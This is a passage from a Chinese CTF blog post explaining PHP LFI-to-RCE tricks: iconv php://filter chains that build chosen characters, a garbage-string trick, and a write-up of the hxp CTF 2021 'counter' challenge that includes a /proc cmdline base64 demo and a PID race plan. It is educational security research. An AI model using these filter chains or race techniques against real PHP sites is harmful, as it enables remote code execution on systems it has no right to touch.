@wupco 老师讨论后，我们要找的字符编码形式要求为( 假设我们要找的字符为 x )：</p><ul><li>x 必须在最终生成的字符串的前端</li><li>字符串前端的字符当中，最好的情况是允许存在仅且唯一一个 x 对于 PHP Base64 来说合法的字符。当然这里可以允许存在其他合法字符，但是对于 fuzz 来说通用性并不强，当确实没办法找到单个字符的时候可以使用多个字符来代替。</li></ul><p>我们简单拿 8 这个字符的编码规则 (<code>convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2</code>) 举个例子：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/convert.iconv.UTF8.UTF7|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 32  30 29 20 22 1b 24 29 43  |string(20) &#34;.$)C|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000020  22 0a                                             |&#34;.|
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/convert.iconv.UTF8.UTF7|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 33  34 29 20 22 ff fe 61 00  |string(34) &#34;..a.|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  61 00 61 00 61 00 61 00  61 00 61 00 61 00 61 00  |a.a.a.a.a.a.a.a.|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000020  61 00 61 00 61 00 61 00  61 00 61 00 61 00 22 0a  |a.a.a.a.a.a.a.&#34;.|
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/convert.iconv.UTF8.UTF7|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 36  38 29 20 22 38 01 fe 00  |string(68) &#34;8...|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  61 00 00 00 61 00 00 00  61 00 00 00 61 00 00 00  |a...a...a...a...|
</span></span></span><span class=line><span class=cl><span class=c1>// *
</span></span></span><span class=line><span class=cl><span class=c1>// 00000050  22 0a                                             |&#34;.|
</span></span></span></code></pre></div><p>可以看到我们通过编码规则逐步拓展了原字符串的字节长度，在原字符串的前端生成了我们想要构造的字符，所以对于我们需要的编码规则条件来说，还需要拓展原字节长度，这也算是第一个条件的原理。</p><p>我们可以基于以上去做一些简单的 fuzz ，整个 fuzz 原理并不复杂，最后检查通过 Filter 规则生成的结果是否满足以上条件即可。这里可以参考一下 @wupco 老师的做法：<a class=link href=https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT target=_blank rel=noopener>PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> ， @wupco 老师基本上把单字母数字集合都找到了</p><h3 id=garbage-string>Garbage String</h3><p>虽然我们知道只要编码规则用得好，其实文件内容是什么无关紧要，但是如果实在是找不到可用文件怎么办？</p><p>这里需要用到一个小技巧：作者发现，<code>convert.iconv.UTF8.CSISO2022KR</code> 总是会在字符串前面生成 <code>\x1b$)C</code> ，所以我们可以利用这个来产生足够的垃圾数据供我们构造 Payload ，以下用一个空文件生成一个 8 来测试：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 8
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;|convert.base64-decode|convert.base64-encode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;/resource=./e&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 31  36 29 20 22 38 47 79 51  |string(16) &#34;8GyQ|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  70 51 77 2b 41 44 30 41  50 51 3d 3d 22 0a        |pQw+AD0APQ==&#34;.|
</span></span></span></code></pre></div><p>这样我们可以使用垃圾数据作为基础数据进行编码转换了。</p><h2 id=related-challenges>Related Challenges</h2><p>虽然这个技巧其实不难想到，但是编码规则这方面确实会令人望而却步，基本令人觉得不可能，但是就是这么的 Tricky ，结合了一些编码技巧做到了这个技巧。</p><h3 id=n1ctf-2020-filter>N1CTF-2020 Filter</h3><p>虽然这个技巧最终是近期才落地，但其实这并不是第一次出现这个想法，比如 @wupco 老师在 n1ctf-2020 中所出的一个 Misc 题 filter ，也是基于此想法。这个题目要求选手 fuzz filter 将二进制文件转换成一个 webshell ，可以说是很符合整个 idea 了，可是这个题最终被非预期了2333，感兴趣的同学可以看看：https://github.com/Nu1LCTF/n1ctf-2020/tree/main/MISC/filters/WriteUp</p><h3 id=hxp-ctf-2021-counter>hxp CTF 2021 counter</h3><p>同样的，在本次 hxp CTF 中 counter 的预期也是利用 php base64 的宽松性，但是相对于 Nginx Tmp LFI 以及本文介绍的 iconv LFI 来说都显得逊色一筹。但是既然也是利用了 PHP base64 的宽松性，我们也顺便稍微介绍一下。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$rmf</span> <span class=o>=</span> <span class=k>function</span><span class=p>(</span><span class=nv>$file</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -f -- &#39;</span><span class=o>.</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=s1>&#39;default&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;./data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;reset&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-zA-Z0-9]+$/&#39;</span><span class=p>,</span> <span class=nv>$page</span><span class=p>)</span> <span class=o>===</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$rmf</span><span class=p>(</span><span class=nv>$page</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$page</span><span class=p>,</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$page</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>include_once</span><span class=p>(</span><span class=nv>$page</span><span class=p>);</span>
</span></span></code></pre></div><p>题目代码如上，我们可以看到题目提供两个功能，一个是写文件包含功能，一个是重置功能。另外我们这里注意的是虽然貌似看起来可以写文件，但是实际上因为 <code>+1</code> 的存在， PHP 会将字符串转换为数字，即使能写入也只有数字。</p><p>按照预期来说，这么看起来是不是摸不着头脑？这里就需要用到一些技巧。</p><p>众所周知，<code>/proc/x/cmdline</code>是用来保存完整的进程启动命令：</p><blockquote><p>/proc/[pid]/cmdline</p><p>This read-only file holds the complete command line forthe process, unless the process is a zombie. In the latter case, there is nothing in this file: that is, a read on this file will return 0 characters. The command-line arguments appear in this file as a set of strings separated by null bytes (&rsquo;\0&rsquo;), with a further null byte after the last string.</p><p>If, after an execve(2), the process modifies its argv strings, those changes will show up here. This is not the same thing as modifying the argv array.</p><p>Furthermore, a process may change the memory location that this file refers via prctl(2) operations such as <strong>PR_SET_MM_ARG_START</strong>.</p><p>Think of this file as the command line that the process wants you to see.</p></blockquote><p>并且查阅手册我们还可以知道其格式会使用 <code>\0</code> 来作为分隔符。</p><p>看到这里，结合我们提到的 PHP Base64 Filter 的宽松性以及题目使用 <code>system('rm -f -- '.escapeshellarg($file));</code> 删除文件，我们是不是可以联想到一起？</p><p>因为这里的 <code>$file</code> 变量是我们可控的，当 PHP 调用 <code>system</code> 的时候会启用一个新进程，而该进程的 <code>cmdline</code> 则正是由 <code>rm -f --</code> 在 sh 中构成的符合 <code>\0</code> 格式标准的字符串；倘若我们传入一个 base64 字符串，就变成了我们上文所说的类似的 Base64 场景，只不过前面是垃圾字符，我们所需要的构造的字符串在后面。我们可以简单弄个 demo ，向一个 tmp 文件当中写入 cmdline 的内容，再使用 PHP Filter Base64 读出来：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=s2>&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./tmp&#34;</span><span class=p>,</span> <span class=s2>&#34;sh</span><span class=se>\x00</span><span class=s2>-c</span><span class=se>\x00</span><span class=s2>rm</span><span class=se>\x00</span><span class=s2>-f</span><span class=se>\x00</span><span class=s2>--</span><span class=se>\x00</span><span class=s2>&#39;&#34;</span><span class=o>.</span> <span class=nv>$payload</span> <span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/read=convert.base64-decode/resource=./tmp&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// PHP Warning:  file_get_contents(): stream filter (convert.base64-decode): invalid byte sequence in /path/x.php on line 4
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=s1>&#39;ab&#39;</span><span class=o>.</span><span class=nx>base64_encode</span><span class=p>(</span><span class=s2>&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./tmp&#34;</span><span class=p>,</span> <span class=s2>&#34;sh</span><span class=se>\x00</span><span class=s2>-c</span><span class=se>\x00</span><span class=s2>rm</span><span class=se>\x00</span><span class=s2>-f</span><span class=se>\x00</span><span class=s2>--</span><span class=se>\x00</span><span class=s2>&#39;&#34;</span><span class=o>.</span> <span class=nv>$payload</span> <span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/read=convert.base64-decode/resource=./tmp&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// ???+???&lt;?php phpinfo(); ?&gt;
</span></span></span></code></pre></div><p>我们了解一下 Base64 编码规则，或者看看 p 文也知道，Base64 以 4 字节为一组，并且对于 PHP Filter Base64 来说，这里的 cmdline 合法字符只有 <code>shcrmf</code> ， 总共 6 个字符，所以我们要补充为 4 的倍数，这里就补充两字节即可让 Base64 解码成功。</p><p>好了，既然我们知道最后去包含这个含有 Base64 字符串的 cmdline 就可以实现 PHP 代码执行了，但是如何知道 PID 呢？而且毕竟这个 rm 命令执行时间比较快，怎么去竞争包含呢？基本看起来就比较的离谱。</p><p>但是题目作者还是比较大心脏，翻阅手册，我们还可以看到：</p><blockquote><p>/proc/sys/kernel/ns_last_pid (since Linux 3.3)</p><p>This file (which is virtualized per PID namespace) displays the last PID that was allocated in this PID namespace. When the next PID is allocated, the kernel will search for the lowest unallocated PID that is greaterthan this value, and when this file is subsequently read it will show that PID.</p><p>This file is writable by a process that has the <strong>CAP_SYS_ADMIN</strong> or (since Linux 5.9) <strong>CAP_CHECKPOINT_RESTORE</strong> capability inside the user namespace that owns the PID namespace. This makes it possible to determine the PID that is allocated to the next process that is created inside this PID namespace.</p></blockquote><p>这个文件会记录最近一次进程使用的 PID ，所以如果我们触发了题目的删除功能，就会产生一个 rm 进程，这里就会记录这个 rm 的 PID 。</p><p>所以大概流程是：</p><ul><li>启动一个线程不断的发送请求让题目使用删除功能，让 PHP 启动进程，从而不断产生一个含有 base64 字符串的 cmdline 文件</li><li>启动一个线程不断的发送请求让题目使用包含功能，根据 ns_last_pid 的值，通过一定猜测 pid 数目竞争，让 PHP 使用 Base64 Filter 竞争包含产生的 cmdline 完成 RCE</li></ul><p>这里贴一下作者的预期脚本：https://pastebin.com/yr11z5h9 。使用作者脚本整体复现还是比较稳定的，但是由于这种方式比较的理论，实际上对于 PID 预测的关键比较复杂，更主要是跟前两种方法相比，这种方法瞬间黯然失色。</p><h2 id=conclusion>Conclusion</h2><p>整个 iconv 的方法还是比较惊艳的，当我们还在执着临时文件的时候，有人已经 fuzz 完成了不需要临时文件的方法，非常敬佩作者对于该种方法的执着。虽然看起来上次我觉得已经是 LFI 的穷途末路了，对于 Nginx 的场景来说利用难度还是比较的低的，但是这一次又一次刷新了我对 LFI 的认知 orz ，以至于看起来是 The End Of LFI ，但是我还是想打上一个问号？说不定 PHP 也有类似 log4j 的玩意呢？</p><p>但是话又说回来，这种方式好玩归好玩，但是说到底还是 LFI ，而且这个方法关键受限于 iconv 支持的自负字符编码以及系统使用的 iconv 所限制，所以并没有想象中那么通用，比如 windows iconv 表现与 linux 的不一致，而某些 CTF 赛题使用的镜像并没有 iconv 等。并且个人感觉 PHP 已经没有 JAVA 那么值得研究了。所以，大家还是看一乐吧 hhhh</p><p>最后，还是得感谢一下 @wupco 老师的不吝赐教(orz</p><p>另外，祝大家新年快乐。上一篇 Nginx Tmp LFI 的文章传送门：https://tttang.com/archive/1384/ ；自己运营的「Funny Web CTF」星球传送门：https://t.zsxq.com/7y7iAuf</p><h2 id=references>References</h2><p><a class=link href=https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d target=_blank rel=noopener>Solving &ldquo;includer&rsquo;s revenge&rdquo; from hxp ctf 2021 without controlling any files</a></p><p><a class=link href=https://www.leavesongs.com/PENETRATION/php-filter-magic.html target=_blank rel=noopener>谈一谈php://filter的妙用</a></p><p><a class=link href=http://www.gnu.org/software/libiconv target=_blank rel=noopener>libiconv</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2021/12/27/2021-12-20-ANewNovelLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/2021/08/02/cybrics-checkin-2021/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/2021/07/21/google-qual-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article><article><a href=/2021/05/19/tls-ctf/><div class=article-details><h2 class=article-title>TLS-Poison 攻击方式在 CTF 中的利用实践</h2></div></a></article><article><a href=/2020/10/15/Defcon28final/><div class=article-details><h2 class=article-title>DEFCON 28 Final 杂记</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var t=document,e=t.createElement('script');e.async=!0,e.src='//ZeddYu.disqus.com/embed.js',e.setAttribute('data-timestamp',+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener('onColorSchemeChange',e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#tldr>TL;DR</a></li><li><a href=#back-to-lfi>Back To LFI</a><ol><li><a href=#php-base64-filter>PHP Base64 filter</a></li><li><a href=#iconv-lfi>Iconv LFI</a></li><li><a href=#craft-base64-payload>Craft Base64 Payload</a></li><li><a href=#rce>RCE</a></li></ol></li><li><a href=#fuzz>Fuzz</a><ol><li><a href=#iconv-filter-chain>iconv Filter Chain</a></li><li><a href=#garbage-string>Garbage String</a></li></ol></li><li><a href=#related-challenges>Related Challenges</a><ol><li><a href=#n1ctf-2020-filter>N1CTF-2020 Filter</a></li><li><a href=#hxp-ctf-2021-counter>hxp CTF 2021 counter</a></li></ol></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#references>References</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script><script>(function(){const e=document.createElement('link');e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>